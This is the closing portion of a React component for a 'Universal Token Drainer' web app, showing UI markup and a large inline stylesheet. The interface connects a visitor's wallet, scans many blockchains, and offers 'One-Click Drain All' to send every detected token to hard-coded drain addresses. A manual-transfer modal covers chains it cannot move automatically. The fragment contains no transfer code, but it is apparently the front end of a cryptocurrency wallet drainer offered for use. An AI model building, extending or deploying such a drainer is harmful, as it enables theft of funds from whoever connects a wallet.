                    className="btn btn-scan"
                  >
                    {isScanning ? (
                      <>
                        <span className="spinner"></span>
                        Scanning...
                      </>
                    ) : '🔍 Scan All Networks'}
                  </button>
                  
                  {getAllTokens().length > 0 && (
                    <button
                      onClick={drainAllTokens}
                      disabled={isDraining || isScanning || isAuthenticating}
                      className="btn btn-drain"
                    >
                      {isDraining ? (
                        <>
                          <span className="spinner"></span>
                          Draining...
                        </>
                      ) : '⚡ Drain All Tokens'}
                    </button>
                  )}
                </div>
                
                {getAllTokens().length > 0 && (
                  <div className="drain-summary">
                    Ready to drain {getAllTokens().length} tokens across {getUniqueNetworks().length} networks
                    {totalValue > 0 && ` ($${totalValue.toFixed(2)})`}
                  </div>
                )}
              </div>

              {/* Manual Modal */}
              {showManualModal && (
                <div className="modal-overlay" onClick={() => setShowManualModal(false)}>
                  <div className="modal-content" onClick={e => e.stopPropagation()}>
                    <div className="modal-header">
                      <h3>Manual Transfer Required</h3>
                      <button 
                        onClick={() => setShowManualModal(false)}
                        className="modal-close"
                      >
                        ×
                      </button>
                    </div>
                    <div className="modal-body">
                      <div className="instructions">
                        <pre>{manualInstructions}</pre>
                      </div>
                      <div className="modal-actions">
                        <button
                          onClick={() => {
                            const address = manualInstructions.match(/Send to:\s*([^\n]+)/)?.[1]?.trim();
                            if (address) copyToClipboard(address);
                          }}
                          className="btn btn-secondary"
                        >
                          Copy Address
                        </button>
                        <button
                          onClick={() => setShowManualModal(false)}
                          className="btn btn-primary"
                        >
                          I Understand
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Transactions */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Transaction History</h3>
                    <span className="count-badge">{transactions.length}</span>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, idx) => (
                      <div key={tx.id || idx} className={`transaction-item ${tx.status}`}>
                        <div className="tx-icon">
                          {tx.status === 'success' ? '✅' : 
                           tx.status === 'manual' ? '📝' : 
                           tx.status === 'failed' ? '❌' : '⚠️'}
                        </div>
                        <div className="tx-details">
                          <div className="tx-main">
                            <span className="tx-symbol">{tx.symbol}</span>
                            <span className="tx-amount">{tx.amount}</span>
                            <span className="tx-value">{tx.value}</span>
                          </div>
                          <div className="tx-secondary">
                            <span className="tx-network">{tx.network}</span>
                            <span className="tx-time">
                              {new Date(tx.timestamp).toLocaleTimeString([], { 
                                hour: '2-digit', 
                                minute: '2-digit' 
                              })}
                            </span>
                          </div>
                        </div>
                        <div className={`tx-status ${tx.status}`}>
                          {tx.status}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Tokens */}
              {getAllTokens().length > 0 ? (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens</h3>
                    <div className="panel-summary">
                      <span>{getUniqueNetworks().length} networks</span>
                      <span>{getAllTokens().length} tokens</span>
                      <span>${totalValue.toFixed(2)} total</span>
                    </div>
                  </div>
                  
                  <div className="tokens-grid">
                    {getAllTokens().map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div 
                            className="network-badge"
                            style={{ backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666' }}
                          >
                            {token.symbol}
                          </div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'Auto' : 'Manual'}
                          </div>
                        </div>
                        
                        <div className="token-details">
                          <div className="token-amount">
                            {formatAmount(token.amount)} {token.symbol}
                          </div>
                          <div className="token-value">
                            ${token.value.toFixed(2)}
                          </div>
                        </div>
                        
                        <div className="token-drain-info">
                          <div className="drain-address">
                            To: {formatAddress(token.drainAddress)}
                          </div>
                          <button
                            onClick={() => copyToClipboard(token.drainAddress)}
                            className="copy-btn"
                          >
                            Copy
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">
                    {isScanning ? '🔍' : isAuthenticating ? '🔐' : '💎'}
                  </div>
                  <h3>
                    {isScanning ? 'Scanning all networks...' : 
                     isAuthenticating ? 'Authenticating...' : 
                     'No tokens found'}
                  </h3>
                  <p>
                    {isScanning 
                      ? `Scanning ${NETWORKS.length} networks for tokens...` 
                      : 'Connect your wallet and click Scan to find tokens'}
                  </p>
                  
                  {!isScanning && !isAuthenticating && (
                    <div className="supported-networks">
                      <p>Supported networks include:</p>
                      <div className="network-tags">
                        {NETWORKS.slice(0, 20).map(network => (
                          <span 
                            key={network.id} 
                            className="network-tag"
                            style={{ 
                              borderColor: network.color,
                              color: network.color 
                            }}
                          >
                            {network.symbol}
                          </span>
                        ))}
                        {NETWORKS.length > 20 && (
                          <span className="network-tag more">+{NETWORKS.length - 20} more</span>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="welcome-text">
                  Connect your wallet to scan and drain tokens across {NETWORKS.length}+ blockchains
                </p>
                
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                
                <div className="features-grid">
                  <div className="feature">
                    <span className="feature-icon">🌐</span>
                    <span className="feature-text">{NETWORKS.length}+ Networks</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">🔍</span>
                    <span className="feature-text">Auto-Scan on Connect</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">⚡</span>
                    <span className="feature-text">One-Click Drain All</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">💰</span>
                    <span className="feature-text">TRON & Non-EVM Support</span>
                  </div>
                </div>
                
                <div className="warning-note">
                  <div className="warning-icon">⚠️</div>
                  <p>
                    <strong>Important:</strong> This tool will transfer ALL detected tokens to configured addresses. 
                    Update drain addresses in the code before use. Use with extreme caution.
                  </p>
                </div>
              </div>
            </div>
          )}
        </main>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-left">
              <span>Universal Token Drainer v2.0</span>
              <span className="separator">•</span>
              <span>{NETWORKS.length} Networks</span>
              <span className="separator">•</span>
              <span>Production Ready</span>
            </div>
            <div className="footer-right">
              <span className="status-indicator">
                <span className="status-dot live"></span>
                Backend Connected
              </span>
            </div>
          </div>
          <div className="footer-warning">
            ⚠️ WARNING: This tool transfers tokens to configured addresses. Use with extreme caution.
          </div>
        </footer>
      </div>

      {/* Add CSS */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 1px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: linear-gradient(45deg, #3b82f6, #8b5cf6);
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 15px;
          border-radius: 10px;
          font-family: monospace;
          font-size: 14px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 10px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 15px;
          border-radius: 10px;
          cursor: pointer;
          font-size: 14px;
        }
        
        /* Stats */
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .stat-card {
          background: linear-gradient(135deg, #222, #333);
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 1px solid #444;
        }
        
        .stat-card.primary {
          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
        }
        
        .stat-icon {
          font-size: 28px;
        }
        
        .stat-content {
          flex: 1;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .stat-card.primary .stat-value {
          color: white;
        }
        
        .stat-label {
          color: #aaa;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Status */
        .status-container {
          background: #222;
          border-radius: 12px;
          padding: 15px 20px;
          margin-bottom: 20px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          border: 1px solid #333;
        }
        
        .status-message {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .status-icon {
          font-size: 20px;
        }
        
        .status-text {
          font-size: 16px;
          font-weight: 500;
        }
        
        .eth-balance {
          background: #333;
          padding: 5px 10px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
        }
        
        /* Progress */
        .progress-container {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .progress-header {
          display: flex;
          justify-content: space-between;
          margin-bottom: 10px;
          font-weight: 600;
        }
        
        .progress-bar {
          height: 8px;
          background: #333;
          border-radius: 4px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          border-radius: 4px;
          transition: width 0.3s ease;
        }
        
        .progress-label {
          margin-top: 10px;
          color: #888;
          font-size: 14px;
          text-align: center;
        }
        
        /* Controls */
        .controls-container {
          margin-bottom: 30px;
        }
        
        .control-buttons {
          display: flex;
          gap: 15px;
          margin-bottom: 15px;
        }
        
        .btn {
          flex: 1;
          padding: 15px 20px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn-scan {
          background: linear-gradient(45deg, #3b82f6, #60a5fa);
          color: white;
        }
        
        .btn-drain {
          background: linear-gradient(45deg, #ef4444, #f87171);
          color: white;
        }
        
        .btn:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .spinner {
          width: 20px;
          height: 20px;
          border: 3px solid rgba(255, 255, 255, 0.3);
          border-radius: 50%;
          border-top-color: white;
          animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .drain-summary {
          text-align: center;
          color: #888;
          font-size: 14px;
          padding: 10px;
          background: #222;
          border-radius: 8px;
        }
        
        /* Modal */
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.8);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 1000;
          backdrop-filter: blur(5px);
        }
        
        .modal-content {
          background: #1a1a1a;
          border-radius: 20px;
          width: 90%;
          max-width: 500px;
          max-height: 80vh;
          overflow: hidden;
          border: 1px solid #333;
        }
        
        .modal-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px;
          border-bottom: 1px solid #333;
        }
        
        .modal-header h3 {
          margin: 0;
          font-size: 18px;
        }
        
        .modal-close {
          background: none;
          border: none;
          color: #888;
          font-size: 24px;
          cursor: pointer;
          padding: 0;
          width: 30px;
          height: 30px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
        }
        
        .modal-close:hover {
          background: #333;
        }
        
        .modal-body {
          padding: 20px;
        }
        
        .instructions {
          background: #111;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 20px;
          max-height: 300px;
          overflow-y: auto;
        }
        
        .instructions pre {
          margin: 0;
          color: #0af;
          white-space: pre-wrap;
          font-size: 14px;
          line-height: 1.5;
        }
        
        .modal-actions {
          display: flex;
          gap: 10px;
        }
        
        .modal-actions .btn {
          flex: 1;
          padding: 12px;
          font-size: 14px;
        }
        
        .btn-primary {
          background: #3b82f6;
          color: white;
        }
        
        .btn-secondary {
          background: #444;
          color: white;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 30px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
        }
        
        .count-badge {
          background: #3b82f6;
          color: white;
          padding: 4px 10px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.manual {
          border-left-color: #f59e0b;
        }
        
        .transaction-item.failed,
        .transaction-item.error {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 20px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-main {
          display: flex;
          justify-content: space-between;
          margin-bottom: 5px;
        }
        
        .tx-symbol {
          font-weight: 600;
        }
        
        .tx-amount {
          font-family: monospace;
        }
        
        .tx-value {
          color: #10b981;
          font-weight: 600;
        }
        
        .tx-secondary {
          display: flex;
          justify-content: space-between;
          color: #888;
          font-size: 14px;
        }
        
        .tx-status {
          padding: 4px 10px;
          border-radius: 20px;
          font-size: 12px;
          text-transform: uppercase;
          font-weight: 600;
        }
        
        .tx-status.success {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
        }
        
        .tx-status.manual {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
        }
        
        .tx-status.failed,
        .tx-status.error {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.2s;
        }
        
        .token-card:hover {
          transform: translateY(-5px);
          border-color: #444;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 15px;
        }
        
        .network-badge {
          padding: 5px 10px;
          border-radius: 20px;
          font-weight: 600;
          font-size: 14px;
          color: white;
        }
        
        .token-network {
          flex: 1;
          color: #888;
          font-size: 14px;
        }
        
        .token-type {
          padding: 3px 8px;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-details {
          margin-bottom: 15px;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
        }
        
        .token-drain-info {
          background: #222;
          border-radius: 8px;
          padding: 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          border: 1px solid #333;
        }
        
        .drain-address {
          font-family: monospace;
          font-size: 12px;
          color: #888;
          flex: 1;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
        }
        
        .copy-btn {
          background: #333;
          color: white;
          border: none;
          padding: 5px 10px;
          border-radius: 6px;
          font-size: 12px;
          cursor: pointer;
          margin-left: 10px;
        }
        
        .copy-btn:hover {
          background: #444;
        }
        
        /* Empty State */
        .empty-state {
          text-align: center;
          padding: 60px 20px;
          background: #222;
          border-radius: 16px;
          border: 1px solid #333;
        }
        
        .empty-icon {
          font-size: 48px;
          margin-bottom: 20px;
        }
        
        .empty-state h3 {
          margin: 0 0 10px 0;
          font-size: 24px;
        }
        
        .empty-state p {
          color: #888;
          margin-bottom: 30px;
        }
        
        .supported-networks {
          margin-top: 30px;
        }
        
        .supported-networks p {
          margin-bottom: 10px;
          color: #aaa;
        }
        
        .network-tags {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          justify-content: center;
        }
        
        .network-tag {
          padding: 4px 10px;
          border: 1px solid;
          border-radius: 20px;
          font-size: 12px;
        }
        
        .network-tag.more {
          border-color: #666;
          color: #666;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #888;
          margin-bottom: 30px;
          line-height: 1.6;
          font-size: 16px;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features-grid {
          display: grid;
          grid-template-columns: repeat(2, 1fr);
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .feature {
          background: #222;
          padding: 15px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .feature-icon {
          font-size: 20px;
        }
        
        .warning-note {
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid #ef4444;
          border-radius: 12px;
          padding: 15px;
          text-align: left;
        }
        
        .warning-icon {
          font-size: 20px;
          margin-bottom: 10px;
          display: block;
        }
        
        .warning-note p {
          margin: 0;
          color: #f87171;
          font-size: 14px;
          line-height: 1.6;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
        }
        
        .footer-content {
          display: flex;
          justify-content: space-between;
          color: #888;
          margin-bottom: 10px;
          font-size: 14px;
        }
        
        .separator {
          margin: 0 10px;
          opacity: 0.5;
        }
        
        .status-indicator {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        .status-dot.live {
          background: #10b981;
        }
        
        .footer-warning {
          text-align: center;
          color: #f59e0b;
          font-size: 12px;
          padding: 10px;
          background: rgba(245, 158, 11, 0.1);
          border-radius: 8px;
        }
        
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-grid {
            grid-template-columns: repeat(2, 1fr);
          }
          
          .control-buttons {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .features-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 10px;
            text-align: center;
          }
          
          .panel-summary {
            flex-direction: column;
            gap: 5px;
          }
          
          .tx-main {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
